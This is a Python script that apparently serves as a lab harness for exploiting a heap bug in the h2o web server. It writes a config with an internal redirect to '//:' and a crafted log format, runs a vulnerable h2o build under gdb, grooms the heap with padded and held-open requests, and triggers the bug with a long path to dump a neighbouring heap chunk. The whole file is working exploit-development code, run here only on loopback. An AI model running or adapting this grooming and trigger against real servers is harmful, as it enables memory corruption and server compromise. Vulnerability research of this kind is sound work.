#!/usr/bin/env python3
"""Throwaway: heap-groom the forced-heap log line, then dump the neighbour chunk.

Modes: base (single trigger), prep (N short pad requests first),
live (a second, never-completed connection holds its read buffer),
mix (prep + live). One trigger per process; all traffic is loopback only.
"""
import os
import socket
import subprocess
import sys
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 18011
mode = sys.argv[1] if len(sys.argv) > 1 else "base"
nprep = int(sys.argv[2]) if len(sys.argv) > 2 else 3
path_len = int(sys.argv[3]) if len(sys.argv) > 3 else 6870
conf = f"{ROOT}/live/heap-groom.conf"
with open(conf, "w") as f:
    f.write(f"""listen:
  host: 127.0.0.1
  port: {PORT}
num-threads: 1
error-log: {ROOT}/live/heap-groom-error.log
hosts:
  default:
    access-log:
      path: {ROOT}/live/heap-groom-access.log
      format: '%{{pad}}i %{{error}}x'
    paths:
      /:
        redirect:
          status: 302
          internal: YES
          url: '//:'
""")
for p in (f"{ROOT}/live/heap-groom-access.log", f"{ROOT}/live/heap-groom-error.log"):
    try:
        os.remove(p)
    except FileNotFoundError:
        pass
proc = subprocess.Popen(
    ["gdb", "-q", "-batch", "-x", f"{ROOT}/live/heap-groom.gdb", "--args",
     f"{ROOT}/src/vuln/build-plain/h2o", "-c", conf],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
)


def ready():
    for _ in range(150):
        try:
            s = socket.create_connection(("127.0.0.1", PORT), 0.2)
            s.close()
            return True
        except OSError:
            time.sleep(0.1)
    return False


def req(header_len, plen):
    r = urllib.request.Request(f"http://127.0.0.1:{PORT}/" + "A" * plen,
                               headers={"pad": "B" * header_len})
    try:
        with urllib.request.urlopen(r, timeout=15) as x:
            return x.status
    except Exception as e:
        return repr(e)


if not ready():
    print("SERVER_NOT_READY")
else:
    holder = None
    if mode in ("live", "mix"):
        holder = socket.create_connection(("127.0.0.1", PORT))
        holder.sendall(b"GET /hold HTTP/1.1\r\nHost: x\r\nX-big: " + b"Z" * 4000)
    if mode in ("prep", "mix"):
        for i in range(nprep):
            print("PREP", i, req(1200 + 700 * i, 20))
    print("TRIGGER", req(1200, path_len))
    if holder is not None:
        holder.close()
try:
    out, _ = proc.communicate(timeout=90)
except subprocess.TimeoutExpired:
    proc.kill()
    out, _ = proc.communicate()
path = f"{ROOT}/live/heap-groom-{mode}.out"
open(path, "w").write(out)
print("TRANSCRIPT", path)
for line in out.splitlines():
    if any(k in line for k in ("HIT ", "CHUNK_", "0x0000555555", "AFTER_RETURN", "[heap]", "Breakpoint 1", "#0 ", "#1 ")):
        print(line[:300])
